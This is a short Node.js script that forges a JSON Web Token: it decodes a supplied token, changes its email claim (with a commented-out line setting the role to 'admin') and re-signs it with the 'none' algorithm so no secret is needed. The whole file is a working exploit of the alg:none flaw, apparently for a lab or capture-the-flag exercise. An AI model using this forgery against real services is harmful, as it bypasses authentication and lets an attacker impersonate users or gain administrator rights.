// Your JWT
let token = 'your token'

const jwt = require('jsonwebtoken');

// Decode the JWT
let payload = jwt.decode(token, { complete: true }).payload;

// Change the role to 'admin'
// payload.data.role = 'admin';
// Change email
payload.data.email = 'demo';

// Encode the payload back into a JWT
let newToken = jwt.sign(payload, '', { algorithm: 'none' });

console.log(newToken);